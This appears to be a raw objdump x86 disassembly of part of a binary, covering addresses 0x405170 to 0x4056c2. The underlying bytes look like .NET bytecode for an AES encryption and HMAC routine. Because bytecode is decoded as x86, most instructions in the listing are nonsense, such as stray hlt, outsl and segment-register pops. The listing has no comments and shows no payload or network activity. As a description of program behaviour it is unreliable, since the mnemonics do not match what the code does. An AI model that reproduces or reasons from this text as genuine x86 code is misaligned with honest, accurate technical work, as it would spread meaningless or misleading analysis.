  405170:	28 f2                	sub    %dh,%dl
  405172:	00 00                	add    %al,(%eax)
  405174:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40517a:	28 f2                	sub    %dh,%dl
  40517c:	00 00                	add    %al,(%eax)
  40517e:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  405184:	28 f2                	sub    %dh,%dl
  405186:	00 00                	add    %al,(%eax)
  405188:	0a a2 28 f3 00 00    	or     0xf328(%edx),%ah
  40518e:	0a 28                	or     (%eax),%ch
  405190:	f4                   	hlt
  405191:	00 00                	add    %al,(%eax)
  405193:	0a 80 3c 00 00 04    	or     0x400003c(%eax),%al
  405199:	7e 3c                	jle    0x4051d7
  40519b:	00 00                	add    %al,(%eax)
  40519d:	04 7b                	add    $0x7b,%al
  40519f:	f5                   	cmc
  4051a0:	00 00                	add    %al,(%eax)
  4051a2:	0a 7e 3c             	or     0x3c(%esi),%bh
  4051a5:	00 00                	add    %al,(%eax)
  4051a7:	04 06                	add    $0x6,%al
  4051a9:	28 06                	sub    %al,(%esi)
  4051ab:	00 00                	add    %al,(%eax)
  4051ad:	06                   	push   %es
  4051ae:	7e 0b                	jle    0x4051bb
  4051b0:	00 00                	add    %al,(%eax)
  4051b2:	04 7e                	add    $0x7e,%al
  4051b4:	10 00                	adc    %al,(%eax)
  4051b6:	00 04 02             	add    %al,(%edx,%eax,1)
  4051b9:	72 9f                	jb     0x40515a
  4051bb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4051bf:	4d                   	dec    %ebp
  4051c0:	00 00                	add    %al,(%eax)
  4051c2:	06                   	push   %es
  4051c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4051c4:	48                   	dec    %eax
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	06                   	push   %es
  4051c8:	7e 39                	jle    0x405203
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	04 7e                	add    $0x7e,%al
  4051ce:	08 00                	or     %al,(%eax)
  4051d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4051d3:	0f 00 00             	sldt   (%eax)
  4051d6:	04 7e                	add    $0x7e,%al
  4051d8:	04 00                	add    $0x0,%al
  4051da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4051dd:	f6 00 00             	testb  $0x0,(%eax)
  4051e0:	0a 28                	or     (%eax),%ch
  4051e2:	94                   	xchg   %eax,%esp
  4051e3:	00 00                	add    %al,(%eax)
  4051e5:	06                   	push   %es
  4051e6:	2a 00                	sub    (%eax),%al
  4051e8:	1b 30                	sbb    (%eax),%esi
  4051ea:	03 00                	add    (%eax),%eax
  4051ec:	53                   	push   %ebx
  4051ed:	00 00                	add    %al,(%eax)
  4051ef:	00 27                	add    %ah,(%edi)
  4051f1:	00 00                	add    %al,(%eax)
  4051f3:	11 02                	adc    %eax,(%edx)
  4051f5:	28 1a                	sub    %bl,(%edx)
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	0a 03                	or     (%ebx),%al
  4051fb:	28 f7                	sub    %dh,%bh
  4051fd:	00 00                	add    %al,(%eax)
  4051ff:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  405202:	72 cd                	jb     0x4051d1
  405204:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  405208:	f8                   	clc
  405209:	00 00                	add    %al,(%eax)
  40520b:	0a 7a 03             	or     0x3(%edx),%bh
  40520e:	7e 43                	jle    0x405253
  405210:	00 00                	add    %al,(%eax)
  405212:	04 20                	add    $0x20,%al
  405214:	50                   	push   %eax
  405215:	c3                   	ret
  405216:	00 00                	add    %al,(%eax)
  405218:	73 f9                	jae    0x405213
  40521a:	00 00                	add    %al,(%eax)
  40521c:	0a 0a                	or     (%edx),%cl
  40521e:	02 06                	add    (%esi),%al
  405220:	1f                   	pop    %ds
  405221:	20 6f fa             	and    %ch,-0x6(%edi)
  405224:	00 00                	add    %al,(%eax)
  405226:	0a 7d 41             	or     0x41(%ebp),%bh
  405229:	00 00                	add    %al,(%eax)
  40522b:	04 02                	add    $0x2,%al
  40522d:	06                   	push   %es
  40522e:	1f                   	pop    %ds
  40522f:	40                   	inc    %eax
  405230:	6f                   	outsl  %ds:(%esi),(%dx)
  405231:	fa                   	cli
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 7d 42             	or     0x42(%ebp),%bh
  405237:	00 00                	add    %al,(%eax)
  405239:	04 de                	add    $0xde,%al
  40523b:	0a 06                	or     (%esi),%al
  40523d:	2c 06                	sub    $0x6,%al
  40523f:	06                   	push   %es
  405240:	6f                   	outsl  %ds:(%esi),(%dx)
  405241:	33 00                	xor    (%eax),%eax
  405243:	00 0a                	add    %cl,(%edx)
  405245:	dc 2a                	fsubrl (%edx)
  405247:	00 01                	add    %al,(%ecx)
  405249:	10 00                	adc    %al,(%eax)
  40524b:	00 02                	add    %al,(%edx)
  40524d:	00 2a                	add    %ch,(%edx)
  40524f:	00 1e                	add    %bl,(%esi)
  405251:	48                   	dec    %eax
  405252:	00 0a                	add    %cl,(%edx)
  405254:	00 00                	add    %al,(%eax)
  405256:	00 00                	add    %al,(%eax)
  405258:	1b 30                	sbb    (%eax),%esi
  40525a:	05 00 00 01 00       	add    $0x10000,%eax
  40525f:	00 28                	add    %ch,(%eax)
  405261:	00 00                	add    %al,(%eax)
  405263:	11 03                	adc    %eax,(%ebx)
  405265:	2d 0b 72 15 27       	sub    $0x2715720b,%eax
  40526a:	00 70 73             	add    %dh,0x73(%eax)
  40526d:	fc                   	cld
  40526e:	00 00                	add    %al,(%eax)
  405270:	0a 7a 73             	or     0x73(%edx),%bh
  405273:	79 00                	jns    0x405275
  405275:	00 0a                	add    %cl,(%edx)
  405277:	0a 06                	or     (%esi),%al
  405279:	1f                   	pop    %ds
  40527a:	20 6a 6f             	and    %ch,0x6f(%edx)
  40527d:	4e                   	dec    %esi
  40527e:	00 00                	add    %al,(%eax)
  405280:	0a 73 fd             	or     -0x3(%ebx),%dh
  405283:	00 00                	add    %al,(%eax)
  405285:	0a 0b                	or     (%ebx),%cl
  405287:	07                   	pop    %es
  405288:	20 00                	and    %al,(%eax)
  40528a:	01 00                	add    %eax,(%eax)
  40528c:	00 6f fe             	add    %ch,-0x2(%edi)
  40528f:	00 00                	add    %al,(%eax)
  405291:	0a 07                	or     (%edi),%al
  405293:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  405299:	ff 00                	incl   (%eax)
  40529b:	00 0a                	add    %cl,(%edx)
  40529d:	07                   	pop    %es
  40529e:	17                   	pop    %ss
  40529f:	6f                   	outsl  %ds:(%esi),(%dx)
  4052a0:	00 01                	add    %al,(%ecx)
  4052a2:	00 0a                	add    %cl,(%edx)
  4052a4:	07                   	pop    %es
  4052a5:	18 6f 01             	sbb    %ch,0x1(%edi)
  4052a8:	01 00                	add    %eax,(%eax)
  4052aa:	0a 07                	or     (%edi),%al
  4052ac:	02 7b 41             	add    0x41(%ebx),%bh
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	04 6f                	add    $0x6f,%al
  4052b3:	02 01                	add    (%ecx),%al
  4052b5:	00 0a                	add    %cl,(%edx)
  4052b7:	07                   	pop    %es
  4052b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b9:	03 01                	add    (%ecx),%eax
  4052bb:	00 0a                	add    %cl,(%edx)
  4052bd:	06                   	push   %es
  4052be:	07                   	pop    %es
  4052bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c0:	04 01                	add    $0x1,%al
  4052c2:	00 0a                	add    %cl,(%edx)
  4052c4:	17                   	pop    %ss
  4052c5:	73 05                	jae    0x4052cc
  4052c7:	01 00                	add    %eax,(%eax)
  4052c9:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4052cc:	07                   	pop    %es
  4052cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4052ce:	06                   	push   %es
  4052cf:	01 00                	add    %eax,(%eax)
  4052d1:	0a 16                	or     (%esi),%dl
  4052d3:	07                   	pop    %es
  4052d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d5:	06                   	push   %es
  4052d6:	01 00                	add    %eax,(%eax)
  4052d8:	0a 8e 69 6f 4c 00    	or     0x4c6f69(%esi),%cl
  4052de:	00 0a                	add    %cl,(%edx)
  4052e0:	08 03                	or     %al,(%ebx)
  4052e2:	16                   	push   %ss
  4052e3:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4052e9:	00 0a                	add    %cl,(%edx)
  4052eb:	08 6f 07             	or     %ch,0x7(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 02                	or     (%edx),%al
  4052f2:	7b 42                	jnp    0x405336
  4052f4:	00 00                	add    %al,(%eax)
  4052f6:	04 73                	add    $0x73,%al
  4052f8:	08 01                	or     %al,(%ecx)
  4052fa:	00 0a                	add    %cl,(%edx)
  4052fc:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  405301:	01 00                	add    %eax,(%eax)
  405303:	0a 1f                	or     (%edi),%bl
  405305:	20 06                	and    %al,(%esi)
  405307:	6f                   	outsl  %ds:(%esi),(%dx)
  405308:	09 01                	or     %eax,(%ecx)
  40530a:	00 0a                	add    %cl,(%edx)
  40530c:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40530f:	20 59 6f             	and    %bl,0x6f(%ecx)
  405312:	0a 01                	or     (%ecx),%al
  405314:	00 0a                	add    %cl,(%edx)
  405316:	13 04 06             	adc    (%esi,%eax,1),%eax
  405319:	16                   	push   %ss
  40531a:	6a 6f                	push   $0x6f
  40531c:	4e                   	dec    %esi
  40531d:	00 00                	add    %al,(%eax)
  40531f:	0a 06                	or     (%esi),%al
  405321:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405324:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  405327:	69 6f 4c 00 00 0a de 	imul   $0xde0a0000,0x4c(%edi),%ebp
  40532e:	1e                   	push   %ds
  40532f:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  405332:	09 6f 33             	or     %ebp,0x33(%edi)
  405335:	00 00                	add    %al,(%eax)
  405337:	0a dc                	or     %ah,%bl
  405339:	08 2c 06             	or     %ch,(%esi,%eax,1)
  40533c:	08 6f 33             	or     %ch,0x33(%edi)
  40533f:	00 00                	add    %al,(%eax)
  405341:	0a dc                	or     %ah,%bl
  405343:	07                   	pop    %es
  405344:	2c 06                	sub    $0x6,%al
  405346:	07                   	pop    %es
  405347:	6f                   	outsl  %ds:(%esi),(%dx)
  405348:	33 00                	xor    (%eax),%eax
  40534a:	00 0a                	add    %cl,(%edx)
  40534c:	dc 06                	faddl  (%esi)
  40534e:	6f                   	outsl  %ds:(%esi),(%dx)
  40534f:	09 01                	or     %eax,(%ecx)
  405351:	00 0a                	add    %cl,(%edx)
  405353:	13 05 de 0a 06 2c    	adc    0x2c060ade,%eax
  405359:	06                   	push   %es
  40535a:	06                   	push   %es
  40535b:	6f                   	outsl  %ds:(%esi),(%dx)
  40535c:	33 00                	xor    (%eax),%eax
  40535e:	00 0a                	add    %cl,(%edx)
  405360:	dc 11                	fcoml  (%ecx)
  405362:	05 2a 01 34 00       	add    $0x34012a,%eax
  405367:	00 02                	add    %al,(%edx)
  405369:	00 99 00 32 cb 00    	add    %bl,0xcb3200(%ecx)
  40536f:	0a 00                	or     (%eax),%al
  405371:	00 00                	add    %al,(%eax)
  405373:	00 02                	add    %al,(%edx)
  405375:	00 67 00             	add    %ah,0x0(%edi)
  405378:	6e                   	outsb  %ds:(%esi),(%dx)
  405379:	d5 00                	aad    $0x0
  40537b:	0a 00                	or     (%eax),%al
  40537d:	00 00                	add    %al,(%eax)
  40537f:	00 02                	add    %al,(%edx)
  405381:	00 23                	add    %ah,(%ebx)
  405383:	00 bc df 00 0a 00 00 	add    %bh,0xa00(%edi,%ebx,8)
  40538a:	00 00                	add    %al,(%eax)
  40538c:	02 00                	add    (%eax),%al
  40538e:	14 00                	adc    $0x0,%al
  405390:	df f3                	fcomip %st(3),%st
  405392:	00 0a                	add    %cl,(%edx)
  405394:	00 00                	add    %al,(%eax)
  405396:	00 00                	add    %al,(%eax)
  405398:	1b 30                	sbb    (%eax),%esi
  40539a:	05 00 37 01 00       	add    $0x13700,%eax
  40539f:	00 29                	add    %ch,(%ecx)
  4053a1:	00 00                	add    %al,(%eax)
  4053a3:	11 03                	adc    %eax,(%ebx)
  4053a5:	2d 0b 72 15 27       	sub    $0x2715720b,%eax
  4053aa:	00 70 73             	add    %dh,0x73(%eax)
  4053ad:	fc                   	cld
  4053ae:	00 00                	add    %al,(%eax)
  4053b0:	0a 7a 03             	or     0x3(%edx),%bh
  4053b3:	73 4d                	jae    0x405402
  4053b5:	00 00                	add    %al,(%eax)
  4053b7:	0a 0a                	or     (%edx),%cl
  4053b9:	73 fd                	jae    0x4053b8
  4053bb:	00 00                	add    %al,(%eax)
  4053bd:	0a 0b                	or     (%ebx),%cl
  4053bf:	07                   	pop    %es
  4053c0:	20 00                	and    %al,(%eax)
  4053c2:	01 00                	add    %eax,(%eax)
  4053c4:	00 6f fe             	add    %ch,-0x2(%edi)
  4053c7:	00 00                	add    %al,(%eax)
  4053c9:	0a 07                	or     (%edi),%al
  4053cb:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4053d1:	ff 00                	incl   (%eax)
  4053d3:	00 0a                	add    %cl,(%edx)
  4053d5:	07                   	pop    %es
  4053d6:	17                   	pop    %ss
  4053d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4053d8:	00 01                	add    %al,(%ecx)
  4053da:	00 0a                	add    %cl,(%edx)
  4053dc:	07                   	pop    %es
  4053dd:	18 6f 01             	sbb    %ch,0x1(%edi)
  4053e0:	01 00                	add    %eax,(%eax)
  4053e2:	0a 07                	or     (%edi),%al
  4053e4:	02 7b 41             	add    0x41(%ebx),%bh
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	04 6f                	add    $0x6f,%al
  4053eb:	02 01                	add    (%ecx),%al
  4053ed:	00 0a                	add    %cl,(%edx)
  4053ef:	02 7b 42             	add    0x42(%ebx),%bh
  4053f2:	00 00                	add    %al,(%eax)
  4053f4:	04 73                	add    $0x73,%al
  4053f6:	08 01                	or     %al,(%ecx)
  4053f8:	00 0a                	add    %cl,(%edx)
  4053fa:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  4053ff:	01 00                	add    %eax,(%eax)
  405401:	0a 1f                	or     (%edi),%bl
  405403:	20 06                	and    %al,(%esi)
  405405:	6f                   	outsl  %ds:(%esi),(%dx)
  405406:	09 01                	or     %eax,(%ecx)
  405408:	00 0a                	add    %cl,(%edx)
  40540a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40540d:	20 59 6f             	and    %bl,0x6f(%ecx)
  405410:	0a 01                	or     (%ecx),%al
  405412:	00 0a                	add    %cl,(%edx)
  405414:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  405417:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40541d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  405423:	11 05 8e 69 6f 45    	adc    %eax,0x456f698e
  405429:	00 00                	add    %al,(%eax)
  40542b:	0a 26                	or     (%esi),%ah
  40542d:	02 11                	add    (%ecx),%dl
  40542f:	04 11                	add    $0x11,%al
  405431:	05 28 9c 00 00       	add    $0x9c28,%eax
  405436:	06                   	push   %es
  405437:	2d 0b 72 43 27       	sub    $0x2743720b,%eax
  40543c:	00 70 73             	add    %dh,0x73(%eax)
  40543f:	0b 01                	or     (%ecx),%eax
  405441:	00 0a                	add    %cl,(%edx)
  405443:	7a de                	jp     0x405423
  405445:	0a 09                	or     (%ecx),%cl
  405447:	2c 06                	sub    $0x6,%al
  405449:	09 6f 33             	or     %ebp,0x33(%edi)
  40544c:	00 00                	add    %al,(%eax)
  40544e:	0a dc                	or     %ah,%bl
  405450:	1f                   	pop    %ds
  405451:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  405457:	0c 06                	or     $0x6,%al
  405459:	08 16                	or     %dl,(%esi)
  40545b:	1f                   	pop    %ds
  40545c:	10 6f 45             	adc    %ch,0x45(%edi)
  40545f:	00 00                	add    %al,(%eax)
  405461:	0a 26                	or     (%esi),%ah
  405463:	07                   	pop    %es
  405464:	08 6f 0c             	or     %ch,0xc(%edi)
  405467:	01 00                	add    %eax,(%eax)
  405469:	0a 06                	or     (%esi),%al
  40546b:	07                   	pop    %es
  40546c:	6f                   	outsl  %ds:(%esi),(%dx)
  40546d:	0d 01 00 0a 16       	or     $0x160a0001,%eax
  405472:	73 05                	jae    0x405479
  405474:	01 00                	add    %eax,(%eax)
  405476:	0a 13                	or     (%ebx),%dl
  405478:	06                   	push   %es
  405479:	06                   	push   %es
  40547a:	6f                   	outsl  %ds:(%esi),(%dx)
  40547b:	75 00                	jne    0x40547d
  40547d:	00 0a                	add    %cl,(%edx)
  40547f:	1f                   	pop    %ds
  405480:	10 6a 59             	adc    %ch,0x59(%edx)
  405483:	17                   	pop    %ss
  405484:	6a 58                	push   $0x58
  405486:	d4 8d                	aam    $0x8d
  405488:	44                   	inc    %esp
  405489:	00 00                	add    %al,(%eax)
  40548b:	01 13                	add    %edx,(%ebx)
  40548d:	07                   	pop    %es
  40548e:	11 06                	adc    %eax,(%esi)
  405490:	11 07                	adc    %eax,(%edi)
  405492:	16                   	push   %ss
  405493:	11 07                	adc    %eax,(%edi)
  405495:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405498:	45                   	inc    %ebp
  405499:	00 00                	add    %al,(%eax)
  40549b:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4054a1:	13 08                	adc    (%eax),%ecx
  4054a3:	11 07                	adc    %eax,(%edi)
  4054a5:	16                   	push   %ss
  4054a6:	11 08                	adc    %ecx,(%eax)
  4054a8:	16                   	push   %ss
  4054a9:	11 08                	adc    %ecx,(%eax)
  4054ab:	8e 69 28             	mov    0x28(%ecx),%gs
  4054ae:	0e                   	push   %cs
  4054af:	01 00                	add    %eax,(%eax)
  4054b1:	0a 11                	or     (%ecx),%dl
  4054b3:	08 13                	or     %dl,(%ebx)
  4054b5:	09 de                	or     %ebx,%esi
  4054b7:	20 11                	and    %dl,(%ecx)
  4054b9:	06                   	push   %es
  4054ba:	2c 07                	sub    $0x7,%al
  4054bc:	11 06                	adc    %eax,(%esi)
  4054be:	6f                   	outsl  %ds:(%esi),(%dx)
  4054bf:	33 00                	xor    (%eax),%eax
  4054c1:	00 0a                	add    %cl,(%edx)
  4054c3:	dc 07                	faddl  (%edi)
  4054c5:	2c 06                	sub    $0x6,%al
  4054c7:	07                   	pop    %es
  4054c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4054c9:	33 00                	xor    (%eax),%eax
  4054cb:	00 0a                	add    %cl,(%edx)
  4054cd:	dc 06                	faddl  (%esi)
  4054cf:	2c 06                	sub    $0x6,%al
  4054d1:	06                   	push   %es
  4054d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4054d3:	33 00                	xor    (%eax),%eax
  4054d5:	00 0a                	add    %cl,(%edx)
  4054d7:	dc 11                	fcoml  (%ecx)
  4054d9:	09 2a                	or     %ebp,(%edx)
  4054db:	00 41 64             	add    %al,0x64(%ecx)
  4054de:	00 00                	add    %al,(%eax)
  4054e0:	02 00                	add    (%eax),%al
  4054e2:	00 00                	add    %al,(%eax)
  4054e4:	57                   	push   %edi
  4054e5:	00 00                	add    %al,(%eax)
  4054e7:	00 4b 00             	add    %cl,0x0(%ebx)
  4054ea:	00 00                	add    %al,(%eax)
  4054ec:	a2 00 00 00 0a       	mov    %al,0xa000000
  4054f1:	00 00                	add    %al,(%eax)
  4054f3:	00 00                	add    %al,(%eax)
  4054f5:	00 00                	add    %al,(%eax)
  4054f7:	00 02                	add    %al,(%edx)
  4054f9:	00 00                	add    %al,(%eax)
  4054fb:	00 d5                	add    %dl,%ch
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 3f                	add    %bh,(%edi)
  405501:	00 00                	add    %al,(%eax)
  405503:	00 14 01             	add    %dl,(%ecx,%eax,1)
  405506:	00 00                	add    %al,(%eax)
  405508:	0c 00                	or     $0x0,%al
  40550a:	00 00                	add    %al,(%eax)
  40550c:	00 00                	add    %al,(%eax)
  40550e:	00 00                	add    %al,(%eax)
  405510:	02 00                	add    (%eax),%al
  405512:	00 00                	add    %al,(%eax)
  405514:	1b 00                	sbb    (%eax),%eax
  405516:	00 00                	add    %al,(%eax)
  405518:	05 01 00 00 20       	add    $0x20000001,%eax
  40551d:	01 00                	add    %eax,(%eax)
  40551f:	00 0a                	add    %cl,(%edx)
  405521:	00 00                	add    %al,(%eax)
  405523:	00 00                	add    %al,(%eax)
  405525:	00 00                	add    %al,(%eax)
  405527:	00 02                	add    %al,(%edx)
  405529:	00 00                	add    %al,(%eax)
  40552b:	00 15 00 00 00 15    	add    %dl,0x15000000
  405531:	01 00                	add    %eax,(%eax)
  405533:	00 2a                	add    %ch,(%edx)
  405535:	01 00                	add    %eax,(%eax)
  405537:	00 0a                	add    %cl,(%edx)
  405539:	00 00                	add    %al,(%eax)
  40553b:	00 00                	add    %al,(%eax)
  40553d:	00 00                	add    %al,(%eax)
  40553f:	00 13                	add    %dl,(%ebx)
  405541:	30 03                	xor    %al,(%ebx)
  405543:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405546:	00 00                	add    %al,(%eax)
  405548:	2a 00                	sub    (%eax),%al
  40554a:	00 11                	add    %dl,(%ecx)
  40554c:	17                   	pop    %ss
  40554d:	0a 16                	or     (%esi),%dl
  40554f:	0b 2b                	or     (%ebx),%ebp
  405551:	0e                   	push   %cs
  405552:	03 07                	add    (%edi),%eax
  405554:	91                   	xchg   %eax,%ecx
  405555:	04 07                	add    $0x7,%al
  405557:	91                   	xchg   %eax,%ecx
  405558:	2e 02 16             	add    %cs:(%esi),%dl
  40555b:	0a 07                	or     (%edi),%al
  40555d:	17                   	pop    %ss
  40555e:	58                   	pop    %eax
  40555f:	0b 07                	or     (%edi),%eax
  405561:	03 8e 69 32 ec 06    	add    0x6ec3269(%esi),%ecx
  405567:	2a 1b                	sub    (%ebx),%bl
  405569:	30 03                	xor    %al,(%ebx)
  40556b:	00 65 00             	add    %ah,0x0(%ebp)
  40556e:	00 00                	add    %al,(%eax)
  405570:	2b 00                	sub    (%eax),%eax
  405572:	00 11                	add    %dl,(%ecx)
  405574:	28 1b                	sub    %bl,(%ebx)
  405576:	00 00                	add    %al,(%eax)
  405578:	0a 02                	or     (%edx),%al
  40557a:	6f                   	outsl  %ds:(%esi),(%dx)
  40557b:	21 00                	and    %eax,(%eax)
  40557d:	00 0a                	add    %cl,(%edx)
  40557f:	0a 73 0f             	or     0xf(%ebx),%dh
  405582:	01 00                	add    %eax,(%eax)
  405584:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405587:	06                   	push   %es
  405588:	6f                   	outsl  %ds:(%esi),(%dx)
  405589:	c5 00                	lds    (%eax),%eax
  40558b:	00 0a                	add    %cl,(%edx)
  40558d:	0a de                	or     %dh,%bl
  40558f:	0a 08                	or     (%eax),%cl
  405591:	2c 06                	sub    $0x6,%al
  405593:	08 6f 33             	or     %ch,0x33(%edi)
  405596:	00 00                	add    %al,(%eax)
  405598:	0a dc                	or     %ah,%bl
  40559a:	73 53                	jae    0x4055ef
  40559c:	00 00                	add    %al,(%eax)
  40559e:	0a 0b                	or     (%ebx),%cl
  4055a0:	06                   	push   %es
  4055a1:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4055a6:	1f                   	pop    %ds
  4055a7:	09 11                	or     %edx,(%ecx)
  4055a9:	04 91                	add    $0x91,%al
  4055ab:	13 05 07 12 05 72    	adc    0x72051207,%eax
  4055b1:	99                   	cltd
  4055b2:	27                   	daa
  4055b3:	00 70 28             	add    %dh,0x28(%eax)
  4055b6:	c6 00 00             	movb   $0x0,(%eax)
  4055b9:	0a 6f 55             	or     0x55(%edi),%ch
  4055bc:	00 00                	add    %al,(%eax)
  4055be:	0a 26                	or     (%esi),%ah
  4055c0:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4055c3:	58                   	pop    %eax
  4055c4:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4055c7:	04 09                	add    $0x9,%al
  4055c9:	8e 69 32             	mov    0x32(%ecx),%gs
  4055cc:	da 07                	fiaddl (%edi)
  4055ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4055cf:	38 00                	cmp    %al,(%eax)
  4055d1:	00 0a                	add    %cl,(%edx)
  4055d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4055d4:	c8 00 00 0a          	enter  $0x0,$0xa
  4055d8:	2a 00                	sub    (%eax),%al
  4055da:	00 00                	add    %al,(%eax)
  4055dc:	01 10                	add    %edx,(%eax)
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	02 00                	add    (%eax),%al
  4055e2:	12 00                	adc    (%eax),%al
  4055e4:	0a 1c 00             	or     (%eax,%eax,1),%bl
  4055e7:	0a 00                	or     (%eax),%al
  4055e9:	00 00                	add    %al,(%eax)
  4055eb:	00 1b                	add    %bl,(%ebx)
  4055ed:	30 02                	xor    %al,(%edx)
  4055ef:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4055f2:	00 00                	add    %al,(%eax)
  4055f4:	2c 00                	sub    $0x0,%al
  4055f6:	00 11                	add    %dl,(%ecx)
  4055f8:	73 0f                	jae    0x405609
  4055fa:	01 00                	add    %eax,(%eax)
  4055fc:	0a 0a                	or     (%edx),%cl
  4055fe:	06                   	push   %es
  4055ff:	02 6f c5             	add    -0x3b(%edi),%ch
  405602:	00 00                	add    %al,(%eax)
  405604:	0a 0b                	or     (%ebx),%cl
  405606:	de 0a                	fimuls (%edx)
  405608:	06                   	push   %es
  405609:	2c 06                	sub    $0x6,%al
  40560b:	06                   	push   %es
  40560c:	6f                   	outsl  %ds:(%esi),(%dx)
  40560d:	33 00                	xor    (%eax),%eax
  40560f:	00 0a                	add    %cl,(%edx)
  405611:	dc 07                	faddl  (%edi)
  405613:	2a 01                	sub    (%ecx),%al
  405615:	10 00                	adc    %al,(%eax)
  405617:	00 02                	add    %al,(%edx)
  405619:	00 06                	add    %al,(%esi)
  40561b:	00 0a                	add    %cl,(%edx)
  40561d:	10 00                	adc    %al,(%eax)
  40561f:	0a 00                	or     (%eax),%al
  405621:	00 00                	add    %al,(%eax)
  405623:	00 1b                	add    %bl,(%ebx)
  405625:	30 04 00             	xor    %al,(%eax,%eax,1)
  405628:	58                   	pop    %eax
  405629:	00 00                	add    %al,(%eax)
  40562b:	00 2d 00 00 11 02    	add    %ch,0x2110000
  405631:	73 4d                	jae    0x405680
  405633:	00 00                	add    %al,(%eax)
  405635:	0a 0a                	or     (%edx),%cl
  405637:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  40563d:	0b 06                	or     (%esi),%eax
  40563f:	07                   	pop    %es
  405640:	16                   	push   %ss
  405641:	1a 6f 45             	sbb    0x45(%edi),%ch
  405644:	00 00                	add    %al,(%eax)
  405646:	0a 26                	or     (%esi),%ah
  405648:	07                   	pop    %es
  405649:	16                   	push   %ss
  40564a:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40564e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405651:	16                   	push   %ss
  405652:	73 10                	jae    0x405664
  405654:	01 00                	add    %eax,(%eax)
  405656:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  40565c:	00 01                	add    %al,(%ecx)
  40565e:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405661:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405664:	08 6f 45             	or     %ch,0x45(%edi)
  405667:	00 00                	add    %al,(%eax)
  405669:	0a 26                	or     (%esi),%ah
  40566b:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40566e:	05 de 14 09 2c       	add    $0x2c0914de,%eax
  405673:	06                   	push   %es
  405674:	09 6f 33             	or     %ebp,0x33(%edi)
  405677:	00 00                	add    %al,(%eax)
  405679:	0a dc                	or     %ah,%bl
  40567b:	06                   	push   %es
  40567c:	2c 06                	sub    $0x6,%al
  40567e:	06                   	push   %es
  40567f:	6f                   	outsl  %ds:(%esi),(%dx)
  405680:	33 00                	xor    (%eax),%eax
  405682:	00 0a                	add    %cl,(%edx)
  405684:	dc 11                	fcoml  (%ecx)
  405686:	05 2a 01 1c 00       	add    $0x1c012a,%eax
  40568b:	00 02                	add    %al,(%edx)
  40568d:	00 28                	add    %ch,(%eax)
  40568f:	00 19                	add    %bl,(%ecx)
  405691:	41                   	inc    %ecx
  405692:	00 0a                	add    %cl,(%edx)
  405694:	00 00                	add    %al,(%eax)
  405696:	00 00                	add    %al,(%eax)
  405698:	02 00                	add    (%eax),%al
  40569a:	07                   	pop    %es
  40569b:	00 44 4b 00          	add    %al,0x0(%ebx,%ecx,2)
  40569f:	0a 00                	or     (%eax),%al
  4056a1:	00 00                	add    %al,(%eax)
  4056a3:	00 1b                	add    %bl,(%ebx)
  4056a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056a8:	52                   	push   %edx
  4056a9:	00 00                	add    %al,(%eax)
  4056ab:	00 2e                	add    %ch,(%esi)
  4056ad:	00 00                	add    %al,(%eax)
  4056af:	11 73 79             	adc    %esi,0x79(%ebx)
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	0a 0a                	or     (%edx),%cl
  4056b6:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  4056bc:	00 0a                	add    %cl,(%edx)
  4056be:	0b 06                	or     (%esi),%eax
  4056c0:	07                   	pop    %es
  4056c1:	16                   	push   %ss
  4056c2:	1a 6f 4c             	sbb    0x4c(%edi),%ch
